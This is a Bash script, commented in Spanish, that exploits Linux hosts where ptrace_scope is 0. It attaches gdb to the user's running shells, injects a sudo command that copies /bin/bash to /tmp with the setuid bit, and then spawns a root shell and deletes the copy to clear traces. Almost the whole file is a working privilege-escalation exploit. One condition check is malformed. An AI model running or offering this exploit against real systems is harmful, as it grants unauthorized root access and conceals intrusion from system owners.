#!/bin/bash

# Declaramos paletilla de colores:

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Para parar la aplicacion al pulsar control C, llama a la función ctrl_c():
trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${redColour}[!]Exiting...\n${endColour}"
# Para volver obtener el cursor (Se hará un tput civis para esconder el cursor
	tput cnorm;
# Devolveremos un código de estado no exitoso.
	exit 1
}
# Función para realizar el ataque
function startAttack(){
# A nivel de sistema, hay un montón de shells (en /etc/shells). Lo primero que se hará será pillar el tipo de shell entonces buscaremos en /etc/shells y pillaremos el último argumento de la ruta para obtener los tipos de shells que hay. Se buscará un formato en el que estén las shells separadas por |.
	cat /etc/shells | grep -v "shells" | tr '/' ' ' | awk 'NF{print $NF}' | sort -u | xargs | tr ' ' '|' > /dev/null 2>&1;  
# Se intentará sacar todos los pids de todas las shells que haya, para eso pusimos los pipes (|) para que pgrep nos lo interprete como distintos. Además se pillarán aquellos pids que se esten aplicando a nivel del usuario que este corriendo la máquina en ese momento.
	pgrep "$(cat /etc/shells | grep -v "shells" | tr '/' ' ' | awk 'NF{print $NF}' | sort -u | xargs | tr ' ' '|')" -u "$(id -u)" | while read shell_pid; do
# La idea es escalar privilegios y convertirse en root. Se trata de sincronizarse desde una consola de bajos privilegios a otra consola con privilegios de root. Para ello usaremos gdb, que tiene un parámetro que es el -p en el que se pueden insertar instrucciones
		if [ $(cat /proc/$shell_pid/comm 2>/dev/null) ] || [ $(pwdx $shell_pid 2>/dev/null) ]; then
			echo -e "\n${yellowColour}PID -> ${endColour} ${greenColour}$shell_pid${endColour}"
			echo -e "\n${yellowColour}Path -> ${endColour} ${greenColour}$(pwdx $shell_pid 2>/dev/null)${endColour}"
			echo -e "\n${yellowColour}Type -> ${endColour}${greenColour} $(cat /proc/$shell_pid/comm 2>/dev/null)${endColour}"
		fi
# Ahora se hará una llamada al sistema donde se creará una nueva bash.
	echo 'call system("echo | sudo -S cp /bin/bash /tmp > /dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash > /dev/null 2>&1")' | gdb -q -n -p "$shell_pid" > /dev/null 2>&1
	done
# Se valida si el terminal que se ha creado existe:
	if [ -f /tmp/bash ]; then
		/tmp/bash -p -c 'echo -ne "\n${yellowColour} Limpiando nuestro rastro... ${endColour}"
		rm /tmp/bash
		echo -e "\t${greenColour}Correcto${endColour}"
		echo -ne "$\n{yellowColour} Obteniendo shell como root... ${endColour}"
		echo -e "\t${greenColour}Correcto${endColour}"
		tput cnorm && bash -p'
	else
		echo -e "\n${redColour}Ha habido un problema, no ha sido posible obtener el UID para actuar como root ${endColour}"
	fi
}
# Para empezar se ocultará el cursor: 
tput civis
# Primero se va a checkear que ptrace_scope está a cero, que es cuando el sistema sería vulnerable.
echo -ne "\n${yellowColour} Checkeando si 'ptrace_scope' está en 0...${endColour}"
# Si la lectura del archivo es un 0, se indicará que se comienza la explotación, sino se dirá que el sistema no es vulnerable.
if grep -q "0" > cat /proc/sys/kernel/yama/ptrace_scope; then
	echo -e "\t ${greenColour}Correcto${endColour}"
	echo -ne "\n${yellowColour}Checkeando si 'gdb' está instalado ${endColour}"
# Se comprueba también que se tiene el programa gdb (por defecto suele estar), no es programa intrusivo ni nada, es un programa para trabajar a nivel ensamblador.
	if command -v gdb > /dev/null 2>&1; then
		echo  -e "${greenColour}\t Correcto ${endColour}"
		echo -e "${yellowColour}\nSe empieza con la escalada de privilegios...\n${endColour}"
# Se llamará a una función para hacer el ataque
		startAttack
# Cuando no se cumplan los requisitos, se indicará y se saldrá del programa.
	else
		echo -e "\t${redColour}Incorrecto${endColour}"
		echo -e "${yellowColour} El sistema no es vulnerable (Pida a alguien como root que instale gdb ${endColour}"
	fi
else
	echo -e "\t${redColour}Incorrecto${endColour}${yellowColour} El sistema no es vulnerable ${endColour}"
fi
# Se deberá tener la herramienta gdb, se validará si está instalado
tput cnorm
